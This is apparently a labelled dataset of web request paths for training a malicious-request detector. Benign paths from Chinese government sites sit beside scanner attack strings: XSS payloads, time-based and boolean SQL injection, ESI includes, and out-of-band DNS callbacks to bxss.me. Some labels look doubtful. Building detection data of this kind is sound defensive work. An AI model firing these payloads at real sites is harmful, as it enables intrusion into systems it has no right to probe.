request	label
/**********/system/2021/08/24/013439103.shtml	0
/****************/images/common/default/img_no_address.png	0
/****/202011/t20201125_256666.html	0
/****/xqdt/hnx/201909/t20190911_142057.html	0
/**********/system/2021/12/17/013495995.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u8000\u6587\u996d\u9986	0
/*****/gy42/ljcpgyview.asp?id=29647740&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/bmkx/sbwg/index_10.html	0
/*******/qiye/b-e257777.html	0
/**/system/2019/03/29/011737706.shtml	0
"/****/web/search?prekeyword=*/-->'""""></iframe></script></style></title></textarea><script >alert(16217)</script>"	1
/**********/system/2021/12/13/013493428.shtml	0
/***/0/02/12/41/2124195_664411.png	0
/********/cgi-bin/ipinfo.cgi?alert(777)	1
/******/hfpcsj/202111/t20211123_196850.html	0
/****/lybltj/202004/t20200408_150512.html	0
/****/202107/t20210730_313250.html	0
"/****/index.cfm?field="""">alert(777)"	1
/zwxx_11337/****/202002/t20200218_1958384.html	0
"/************/template/jcse/110105008056111/16/images<esi:include src=""""http://bxss.me/rpb.png""""/>/plugin/selectpick/js.js"	1
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress	1
/****/czgk/bmyjs/rmtt/gsl/202103/t20210309_2620235.html	0
/************/interfaces/autocomplete.do?cateid=1&eq=&oq=&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=15&pos=&pq=&q=请输入关键词&ranksign=&searchid=1&total=&tpl=16&websiteid=110105008056111	1
/investors-garden/**********/graphic' and 2*3*8=6*8 and 'knvw'='knvw/2020-02-27/8981.html	1
/******/usercenter/index?qrcode=13542	0
/***/003/002/940/00300294087_e48f0177.jpg	0
"/****/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202110/t20211028_195962.html	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1829&h=1029&treeid=1022&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2luzm8vmtexnc8xmjc0lmh0bq==&pagename=l2luzm8uannw&newsid=1221	0
/****/zdlygk/bzxajgc/gys/if(now()=sysdate(),sleep(12),0).htm	1
/******/system/2018/01/21/javascript:void();	1
/*******/qiye/b-e1922138.html	0
/***/800/11/09/90/11099074_998345.jpg	1
/******/system/2020/08/12/013224958.shtml	0
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062967	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u6d41\u884c\u8272\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6b27\u666e\u53a8\u536b\u7ecf\u9500\u90e8	0
"/****/呼和浩特?page='""""()&%<acx><script >yr1d(9159)</script>"	1
/******/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/******/usercenter/index?qrcode=31413	0
/******/usercenter/index?qrcode=quicklyrq,3,45069,54575&code=091l61ga1k1dkc0cnpja1m1ipn4l61gr	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5999\u5c1a\u5316\u5986\u540d\u54c1\u5e97	0
/**********/system/2020/06/03/013176831.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u6b23\u6b23\u7efc\u5408\u95e8\u5e02\u90e8	0
/zwxx_11337/****/201703/t20170310_303885.html	0
/*****/dmqh/images/10.gif	0
/**********/system/2021/09/26/ data:image/svg xml,<svg width=	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4e2a\u4f53\u7ecf\u8425\u8000\u9f99\u8fd0\u8f93\u90e8	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u4e16\u660e\u9884\u5236\u5382	0
/****/qbjk9w-article-e114746837.html	0
/***/0/01/68/22/1682277_307822.jpg	0
/****/20210528/9919.html	0
"/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/201903/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
/****/xxgkzn'||'/list.html	1
/*****/b-e344328.html	0
/******/if(now()=sysdate(),sleep(12),0)/js/newcalendar/config.js	1
/****/gsry/2008_506/	0
"/****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/**********/system/2013/09/18/011191788.shtml	0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/zws/yzq/xmb_gzdxb.htm	1
/****/zdlygk/gytdsdfwzs/szss/zcwj.htm	1
/***/0/00/63/21/632140_274607.jpg	0
"/****/bysrd/201610/t20161016_531<esi:include src=""""http://bxss.me/rpb.png""""/>.html"	1
/******/visitcount/visit.jsp?i_articleid=242356&i_columnid=31&i_webid=if(now()=sysdate(),sleep(15),0)&type=3	1
"/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/xss.html?	1
/****/api/sources?resource=alert(/777/)&format=txt	1
/**********/system/2020/12/21/013306445.shtml	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u9ea6\u57df\u70d8\u7119\u574a	0
/**********/system/2020/06/05/013178806.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4f73\u8dc3\u901a\u8baf\u90e8	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u9999\u5170\u9601\u5546\u884c	0
/****/ztjj2022lz/lhsd/javascript:void(0);	1
/**/ui/widgets/hanweb'||'/iconfont/css/iconfont.css	1
"/****/scripts/booking/eventlist.php?serviceid=1337"" onmouseover=""alert(777)"	1
/****/jtdt/2021_jtyw/index_3.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6b23\u61ff\u8f89\u5e7f\u544a\u8bbe\u8ba1\u5236\u4f5c\u90e8	0
/****/czgk/bmyjs/zzqjcyxt/ycsrmjcy/index_1.html	0
/**/index.php?title=acunetixtestb87975&action=submit	1
/********/upload/fckeditor/jianglibanfan.doc	0
/***/0/00/15/86/158634_751117.jpg	0
/***/blockdata/getsearchinfo.do?&title=\u5899	0
/******/download/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx' and 5309=5309 and 'ajst'='ajst	1
/***/0/01/60/25/1602583_999249.jpg	0
/******/usercenter/index?qrcode=13835&code=071ou9ml2zznl843llml2h7xoh3ou9mm	0
/****/xxgkml/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/	1
/***********/ztjd/2016/8/201608171706102747.xls	0
/**********/system/2021/06/03/013395759.shtml	0
/**********/system/2021/12/13/013493874.shtml	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqzfwdwzcyjs/201708/t20170818_549590.html	0
"/*****/index.php?action=list&order=nan""/><script>alert(777);</script>me&srt=yes"	1
/******/public/2021/03/13/103031.images/v103031_b1615645727110_app.jpg/index_1.html	0
/**********/system/2021/10/18/013465999.shtml	0
"/****/"""".gethostbyname(lc(""""hitvb"""".""""omdxlipef5a51.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(108).chr(70).chr(102).chr(66).""""/1088/1105/list.html"	1
/****/byszx/201611/t20161121_76519.html?leader=bxss.me	1
/****/kjzl/gjcp/fzjx/	0
/*****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e09\u8425\u9547\u7a46\u65af\u6797\u98df\u54c1\u5e97	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u946b\u660c\u76db\u6c7d\u8f66\u4fee\u7406\u670d\u52a1\u90e8	0
/****/202104/t20210427_273110.html	0
/***/interface/comul_total.json.jsp?callback=jquery171013918798478531563_1639990948178	0
"/**********/ywdt.htm""onclick=""_adddynclicks(&"	1
/******/images/logoline.png	0
/**********/system/2020/07/13/013204663.shtml	0
/**********/system/2021/12/19/013496527.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u53cb\u597d\u5546\u5e97	0
/***/index.php?c=user&a=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()'//	1
/*******/qiye/b-e1647858.html	0
/****/201909/t20190926_1756579.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 3434=3434 and '%%'='%	1
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/*****/gy48/cpgyss.asp?key=\u6c34\u5206\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\u0328\ufffd\ufffd	0
/****/whs/yw_1286/201707/t20170704_314598.html	0
/***/0/01/94/50/1945054_966488.jpg	0
"/' 'a'.concat(70-3).concat(22*4).concat(107).concat(82).concat(118).concat(72) (require'socket'
socket.gethostbyname('hitib' 'vquipiur065ac.bxss.me.')[3].to_s) '/***/slick.css"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bfa a\u8f7f\u8f66\u7ef4\u4fee\u4e2d\u5fc3	0
"/' 'a'.concat(70-3).concat(22*4).concat(112).concat(71).concat(99).concat(83) (require'socket'
socket.gethostbyname('hitxx' 'dphmubsyaab1d.bxss.me.')[3].to_s) '/**/lib/easyui/plugins/jquery.parser.js"	1
/*******/qiye/businesses-e19850_3.html?category_id=232412	0
"/*******/mydevice/loggedout.jsp?locale=""""><script>alert(777)</script>"	1
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u91d1\u897f\u517b\u6b96\u5382	0
/****/js/chunk-16a0b950.640ac533.js	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u8fdb\u53d1\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u9970\u754c\u65e0\u9650\u5927\u9970\u54c1\u5e97	0
/****/bwcx/dtbb/jtdt/index_3.html	0
"/************/template/jcse/"""" """"a"""".concat(70-3).concat(22*4).concat(101).concat(71).concat(118).concat(83) (require""""socket""""
socket.gethostbyname(""""hitlk"""" """"doyvktkj704c6.bxss.me."""")[3].to_s) """"/16/images/result.css"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5170\u661f\u77f3\u6cb9\u9500\u552e(\u96c6\u56e2)\u516c\u53f8\u7269\u6d41\u5206\u516c\u53f8	0
/**/admin/dash_status.php?status_data[1]=alert(777);	1
/****/system/2021/08/13/013434248.shtml	0
"/************/search.do?"""".gethostbyname(lc(""""hitjx"""".""""mlryuwskf1f65.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(113).chr(83).chr(106).chr(71)."""""	1
"/col'""""()&%<acx><script >tap2(9809)</script>/*****/index.html"	1
/****/system/2011/03/04/javascript:dozoom(9)	1
"/****/bxss.me/t/xss.html?	1
/zwxx_11337/****/201707/w020170727659961364828.jpg	0
/***/0/02/03/37/2033711_543916.png	0
/******/appweb.do?method=queryappdatabyfields&groupid=293&appid=348&ishome=0&field=querynumber,title,xjlx,replytime,status&flag=hdjl	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u58a8\u8bed\u4e66\u753b\u7ecf\u9500\u90e8	0
"/****/zfxxgk/fdzdgknr/qtfdxx/?wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
"/****/bxss.me/t/xss.html?	1
/****/wp-admin/post-new.php?post_type=inbound-forms&post='>alert(777)	1
/**/products/industrialmachinery/201505/w020150513293978163794.jpg	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u963f\u91cc\u5df4\u5df4	0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/css.js	1
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/bmwj/list.html?new='.gethostbyname(lc('hitvx'.'psdcepwwb9d89.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(88).chr(109).chr(67).'	1
"/***/col200/bxss.me/t/xss.html?	1
"/****/web/search?channelid=234439' and 0763=0763 	1
/**/ui/lib/easyui/plugins/jquery.draggable' and 2*3*8=6*8 and 'r7fw'='r7fw.js	1
/**********/system/2021/11/03/013474893.shtml	0
"/****/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/sj1/tjxx/index_5.html	0
"/****/category/fazhanzhanlue?page=*/-->'""""></iframe></script></style></title></textarea><script >alert(43645)</script>"	1
/*******/rd7j.php	1
/**********/system/2020/12/08/013298517.shtml	0
/******/jquery.min.js	1
"/******/5/bxss.me/t/xss.html?	1
/**/mediacenter/specials/cths/202102/t20210203_270253.html	0
/****/web/js/jquery.min.js	1
/******/list.php	1
/**/if(now()=sysdate(),sleep(6),0).css	1
/****/zzxxgk/smzw/xxgkml/ybjzcjd/202007/t20200720_169511.html	0
"/****/czgk/bmyjs/rmtt/fl/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
"/****/zfwjn/1079/1081/"""" """"a"""".concat(70-3).concat(22*4).concat(98).concat(89).concat(112).concat(88) (require""""socket""""
socket.gethostbyname(""""hittk"""" """"ocqlfqdt12811.bxss.me."""")[3].to_s) """".html"	1
/****/bmkx/swjw/201904/w020190420622693383835.jpg	0
/*******/0xnw6.php	1
/****/xqldly/hfbyqz/201901/t20190117_113769.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u94f6\u5ddd\u5316\u80a5\u5382\u4e2d\u5b81\u53bf\u5eb7\u6ee9\u4e61\u7530\u6ee9\u5c3f\u7d20\u76f4\u9500\u70b9	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u81f4\u8fdc\u4fbf\u5229\u5546\u5e97	0
/******/sjy/	0
/******/usercenter/index?qrcode=37693&code=071dt9ml2benl84rtpol2a5khu0dt9mh	0
/**/system/2021/11/08/012217615.shtml	0
/*****/e135038027.html	0
"/****/http://bxss.me/t/xss.html?	1
/****/zdlygk'||'/ncwywfgz/zws/yzq/xmb_gzdxb.htm	1
/*********/index_4.html	0
/**********/system/2021/08/04/013430307.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgdzt/202108/t20210818_2978335.html	0
"/********/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/******/system/2019/08/02/012941490.shtml	0
/******/system/2010/04/26/010107668.shtml	0
/************/template/jcse/110105008056111/bxss.me/images/ui.css	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(697)"">?_=1630311551166"	1
/****/zzxxgk/tjj'||'/zfxxgkml_2127/jytabljg_2061/list.html	1
/****/system/2021/04/14/013368672.shtml	0
/****/xxgkml/zfczyjs/bmyjs/201705/w020170511417616090715.xlsx	0
/****/whs/yw_1286/202105/t20210521_2850174.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u9a6c\u548c\u7efc\u5408\u95e8\u5e02\u90e8	0
/**********/system/2021/10/07/013460878.shtml	0
/*****/h1603379815.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u6d69\u6d69\u5546\u5e97	0
/zwxx_11337/****/202012/t20201230_2543850.html	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5927\u6b66\u53e3\u533a\u6c9b\u8fb0\u6587\u5177\u5e97	0
/zwxx_11337/****/201707/t20170727_302920.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u4e92\u5229\u901a\u8d27\u8fd0\u90e8	0
/******/js/top.js	0
/****/system/more/17306000000000000/0000/17306000000000000_00000024.shtml	0
/****/system/2017/06/06/javascript:window.print()	1
/*****/gy48/cpgyss.asp?key=\u6c7d\u8f66\u9ad8\u5f3a\u94a2\u677f&l=\ufffd\ufffd\ufffd\ufffd	0
/****/xxgknb/2016/bmnb2016/201703/t20170327_86883.html	0
"/***********/shangpinqihuo/nongchanpin/2021-01-14/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.html"	1
"/************/template/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js/""""><script>alert(4692)</script>"	1
"/' 'a'.concat(70-3).concat(22*4).concat(119).concat(89).concat(106).concat(87) (require'socket'
socket.gethostbyname('hitkr' 'yzprhtzv9c886.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js"	1
/****/xydt/2015_hydt/index_3.html	0
/*****/system/2021/11/17/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u798f\u8fd0\u6765\u53e3\u9999\u997c\u5b50\u5e97	0
/**********/system/2020/02/28/013098006.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5a1c\u5c14\u82f1\u5b50\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u597d\u53c8\u591a\u670d\u88c5\u5e97	0
/***/resource/js/i,n.onnodecreated&&n.onnodecreated(r,n,t,i),currentlyaddingscript=r,baseelement?head.insertbefore(r,baseelement):head.appendchild(r),currentlyaddingscript=null,r&if(iswebworker)try{settimeout(function(){},0),importscripts(i),e.completeload(t)}catch(r){e.onerror(makeerror(=	1
"/zwxx_11337/****/\""javascript:void(0)\"""	1
/zwxx_11337/****/zcjd/201905/t20190529_1527758.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u68ee\u6797\u4f11\u95f2\u5564\u9152\u5c4b	0
/****/zfgb/2021/202102/p020210225541653941412.pdf	0
/**********/system/2016/08/24/012105129.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u5218\u536b\u5f3a\u4e94\u91d1\u7ecf\u9500\u90e8	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3612)"">?_=1630311975105"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u5973\u4eba\u7a7a\u95f4\u670d\u88c5\u5e97	0
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062211	0
"/****/zzxxgk/tjj/zfxxgkml_2127/bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u822a\u5e7f\u544a\u88c5\u6f62\u6709\u9650\u516c\u53f8	0
/*******/202010/202010131132191098.html	0
/xxgk' and 2*3*8=6*8 and 'iy5i'='iy5i/******/tjj/zfxxgkml_2127/jytabljg_2061/list.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6b27\u989c\u5316\u5986\u54c1\u5e97	0
/zwxx_11337/****/202002/t20200218_1958958.html	0
/**********/system/2021/12/02/013488886.shtml	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7a33\u5916\u8d44	0
/****/zgsdt/zgs16/201610/t20161010_102670.html	0
/*******/newfile.php	1
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062350&_=1617696562436	0
/*********/cms/javascript:	1
/****/zt/lxyz/202111/t20211116_3130146.html	0
/zwxx_11337/****/201812/w020181219315408716136.jpg	0
/*******/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/***/0/02/03/82/2038270_026035.jpg	0
/***/index.php?c=dt&a=editor&do=design&id=273&	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u91d1\u971e\u8089\u725b\u80b2\u6b96\u573a	0
/xwzx' and 2*3*8=6*8 and 'k2n4'='k2n4/****/sgaj/	1
/**********/system/2021/12/13/013493916.shtml	0
/*****/gy48/cpgyss.asp?key=\u7f8e\u5b5ashc100&l=\ufffd\ufffd\ufffd\ufffd	0
/******/public/2021/12/08/111217.images/v111217_b1638927347563.jpg	0
/****/whhd/201412/t20141218_47952.html	0
/***/0/01/02/82/1028280_561472.jpg	0
/******/if(now()=sysdate(),sleep(0),0).js	1
/**********/2017-01-0'xor(if(now()=sysdate(),sleep(9),0))xor'z.html	1
"/****/system/2021/04/22/013373702'""/>//</script//>//<svg/onload=alert(2575) width=100///>.shtml"	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e34\u6cb3\u9547\u8303\u5143\u5546\u5e97	0
/***/com/login.asp?logintype=xm' and 9510=2646 and 'tegr'='tegr	1
/***/0/01/70/76/1707669_972391.jpg	0
/**********/system/2021/10/02/013459825.shtml	0
"/investors-garden/***/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z_2.html"	1
/****/sj1/tjsj/index_6.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9ea6\u91d1\u7a57\u7eaf\u6c64\u725b\u8089\u9762	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8fce\u6c34\u9547\u5e7f\u517c\u7269\u8d44\u9500\u552e\u90e8	0
"/***/resource/fonts/fontawesome-webfont.ttf?v="""";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"""""	1
/******/system/2010/12/21/010256416.shtml	0
/**********/system/2020/06/04/013177854.shtml	0
"/****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
/****/gccb/qcgc/	1
/***/getsubject?vno=3.5.0×tamp=1640053524198&	0
/**/system/2021/12/09/012228689.shtml	0
/****/zzxxgk/jjhzj/zsxw/202104/t20210412_180065.html	0
/****/zjdt/zjdt/gzdt'||'/1.htm	1
/****/purchaseorder/infolist.z	0
/******/sc/img3/3.jpg	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7a46\u5170\u4ead\u51c0\u6c34\u65e9\u8336\u725b\u8089\u9762\u9986	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u6843\u82b1\u88c5\u9970\u6750\u6599\u6279\u53d1\u90e8	0
/****/bmkx/sfgw/202102/local.replace(	0
/******/system/2021/08/09/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u660e\u5353\u5065\u8eab\u5851\u5f62\u4f1a\u6240	0
/******/cms/www/201709/15090459aesr.jpg	0
/**********/system/more/201000000000000/0020/201000000000000_00002058.shtml	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u77f3\u70ad\u4e95\u6768\u5bb6\u996d\u9986	0
/**********/system/2020/02/03/013070777.shtml	0
/****************/notification?access_token=92b8581f-a1d4-4bdd-9c10-fa7c3d53d17b&id=undefined	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5a1f\u5a1f\u917f\u76ae\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5c0f\u97e9\u5546\u884c	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw_1815/202108/t20210818_2978883.html	0
"/***/?refresh="""";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()""""//"	1
/****/0718/786679.shtml	0
/******/	1
/zwxx_11337/****/202107/t20210715_2925130.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u51e4\u51f0\u88c5\u9970\u884c\u91d1\u51e4\u9910\u9986	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6708\u9999\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/***/xylbj/index.shtml	0
/***/0/01/41/58/1415826_270182.png	0
"/**/ui/widgets/http://bxss.me/t/xss.html?	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqtyj/	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u6f58\u6885\u7eb8\u8d27\u5e97	0
/******/system/2019/06/26/012913932.shtml	0
"/****/zfcwhy/202107/' 'a'.concat(70-3).concat(22*4).concat(120).concat(90).concat(108).concat(74) (require'socket'
socket.gethostbyname('hitlg' 'sjmgbmpya820b.bxss.me.')[3].to_s) '_2938511.html"	1
/**********/system/2021/07/05/javascript:window.close();	1
/******/huiyi.css	0
/****/zt/202005/w020200523419795673930.jpg	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5c11\u4f59\u5e9f\u65e7\u7269\u8d44\u56de\u6536\u6709\u9650\u516c\u53f8	0
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid=	1
/zwxx_11337/****/202003/t20200310_1984563.html	0
/**/ui/widgets'||'/validity/validity.js	1
"/*****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery191049439450065261314_1640016367176	0
"/****/dashboard/index/41730?did=4&period=3"""">alert(/777/)"	1
/****/20170502/3040.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u67cf\u6da6\u5ddd\u88c5\u9970\u6709\u9650\u516c\u53f8	0
/*****/index'||'/goods.html	1
/******/system/2021/11/26/javascript:void();	1
"/****/gfxwj/202006/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/******/search.jsp	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u6210\u6d69\u518d\u751f\u8d44\u6e90\u6709\u9650\u516c\u53f8	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(117).concat(80).concat(121).concat(74) (require""""socket""""
socket.gethostbyname(""""hitlm"""" """"sycvkumk52fef.bxss.me."""")[3].to_s) """"/**/lib/security/sm2.js"	1
"/****/dashboard/index/41730?did=4&period=3"""">alert(/777/)"	1
/*******/201902/201902010952151009.html	0
/******/system/2019/08/20/012954602.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19103867804441037721_1639980432653	0
/****/bmkx/swgxj/index_3.html	0
/****/bmkx/ygjt/201807/t20180703_105006.html	0
/****/web/search?channelid=299868&perpage=1000') or 0986=0986 and '1'='1	1
/***/mobile_h5/waparticledetail.do?article_id=202106111116051091&contenttype=article	0
/****/qzfwj/list_46.html	0
"/****/czgk/bmyjs/zzqdwgzbmyxsjg/\""javascript:void(0)\"""	1
/****/http://bxss.me/t/fit.txt?.jpg/hfswsj/zmhdyc.html	1
/******/public/2021/12/13/111659.images/v111659_b1639358996493.jpg	0
"/****/zzxxgk/tjj/zfxxgkml<esi:include src=""""http://bxss.me/rpb.png""""/>_2127/jytabljg_2061/list.html"	1
/****/xxgknb/2018/bmnb2018/201903/t20190315_115208.html	0
/**/mediacenter/specials/smiiceibz/index_3.html	0
